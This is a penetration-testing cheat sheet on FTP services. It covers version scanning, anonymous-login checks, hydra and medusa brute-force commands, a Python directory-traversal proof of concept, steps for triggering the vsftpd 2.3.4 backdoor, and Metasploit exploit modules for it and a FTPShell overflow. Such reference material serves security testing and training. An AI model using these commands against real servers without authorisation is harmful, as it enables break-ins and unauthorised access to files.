# FTP

## Version Detection

### nmap

Included in the default `-sV`

```bash
nmap -sV -sC 192.0.2.1
```

See [here][1] for more details

### metasploit

```console
msf > use auxiliary/scanner/ftp/ftp_version
msf auxiliary(ftp_version) > show actions
    ...actions...
msf auxiliary(ftp_version) > set ACTION < action-name >
msf auxiliary(ftp_version) > show options
    ...show and set options...
msf auxiliary(ftp_version) > run
```

See [here][2] for more details

## File Enumeration

### ftp

```bash
ftp 192.0.2.1
```

### lftp

```bash
lftp 192.0.2.1
```

### FileZilla

## Anonymous Login

Enter `anonymous` for the username and 

```shell
$ ftp 192.0.2.1
Connected to 192.0.2.1
220 (vsFTPd 3.0.3)
Name (192.0.2.1:user): anonymous
230 Login successful.
Remote system type is UNIX
Using binary mode to transfer files.
ftp> 
```

### Check Anonymous Login

#### nmap

```bash
nmap -p 21 192.0.2.1 --script ftp-anon
```

See [here][3] for more details

#### metasploit

```console
msf > use auxiliary/scanner/ftp/anonymous
msf auxiliary(anonymous) > show actions
    ...actions...
msf auxiliary(anonymous) > set ACTION < action-name >
msf auxiliary(anonymous) > show options
    ...show and set options...
msf auxiliary(anonymous) > run
```

See [here][4] for more details

## Brute Force User

### Default Credentials

- https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

### hydra

```bash
hydra -L usernames.txt -P passwords.txt ftp://192.0.2.1
```

```bash
hydra -L usernames.txt -P passwords.txt 192.0.2.1 ftp
```

### medusa

```bash
medusa -h 192.0.2.1 -U usernames.txt -P passwords.txt -M ftp
```

## CVEs

### HOME FTP Server Directory Traversal (CVE-2009-4053)

> Multiple directory traversal vulnerabilities in Home FTP Server 1.10.1.139 allow remote authenticated users to (1) create arbitrary directories via directory traversal sequences in an MKD command or (2) create files with any contents in arbitrary directories via directory traversal sequences in a file upload request. NOTE: the provenance of this information is unknown; the details are obtained solely from third party information.

#### NVD

See [here][5] for more details

#### PoC

The following Python script creates a `foo` directory in the parent directory

```python
import socket

hostname = '192.0.2.1'
port = 21
username = 'anonymous'
password = ''

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
sock.recv(1024)
sock.send("USER {}\r\n".format(username))
sock.recv(1024)
sock.send("PASS {}\r\n".format(password))
sock.recv(1024)
sock.send("MKD ../foo\r\n")
sock.close()
```

#### Exploitdb

```bash
searchsploit -m 10162
```

See [6] for more details

### vsftpd v2.3.4 Backdoor

Some attackers managed to place a backdoor in vsFTPd 2.3.4 [7].

#### nmap Scan

```bash
nmap --script ftp-vsftpd-backdoor -p 21 192.0.2.1
```

See [8] for more details

#### Manual Exploit

1. Login with any user that ends with `":)"`
2. Connect directly to port 6200

#### Exploitdb

```bash
searchsploit -m 49757
```

See [9] for more details

#### Metasploit

```console
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show targets
    ...targets...
msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
msf exploit(vsftpd_234_backdoor) > show options
    ...show and set options...
msf exploit(vsftpd_234_backdoor) > exploit
```

See [10] for more details

### FTPShell Client 6.70 Buffer Overflow (CVE-2018-7573)

> An issue was discovered in FTPShell Client 6.7. A remote FTP server can send 400 characters of 'F' in conjunction with the FTP 220 response code to crash the application; after this overflow, one can run arbitrary code on the victim machine. This is similar to CVE-2009-3364 and CVE-2017-6465.

See [11] for more details

#### Exploitdb

```bash
searchsploit -m 44596
```

See [12] for more details

#### Metasploit

```console
msf > use exploit/windows/ftp/ftpshell_cli_bof
msf exploit(ftpshell_cli_bof) > show targets
    ...targets...
msf exploit(ftpshell_cli_bof) > set TARGET < target-id >
msf exploit(ftpshell_cli_bof) > show options
    ...show and set options...
msf exploit(ftpshell_cli_bof) > exploit
```

See [13] for more details

## Tools

- [lftp](https://github.com/lavv17/lftp) - sophisticated command line file transfer program (ftp, http, sftp, fish, torrent)

## Reference

- [1]: <https://nmap.org/nsedoc/scripts/ftp-syst.html>
- [2]: <https://www.rapid7.com/db/modules/auxiliary/scanner/ftp/ftp_version/>
- [3]: <https://nmap.org/nsedoc/scripts/ftp-anon.html>
- [4]: <https://www.rapid7.com/db/modules/auxiliary/scanner/ftp/anonymous/>
- [5]: <https://nvd.nist.gov/vuln/detail/CVE-2009-4053>
- [6]: <https://www.exploit-db.com/exploits/10162>
- [7]: <https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html>
- [8]: <https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html>
- [9]: <https://www.exploit-db.com/exploits/49757>
- [10]: <https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/>
- [11]: <https://nvd.nist.gov/vuln/detail/CVE-2018-7573>
- [12]: <https://www.exploit-db.com/exploits/44596>
- [13]: <https://www.rapid7.com/db/modules/exploit/windows/ftp/ftpshell_cli_bof/>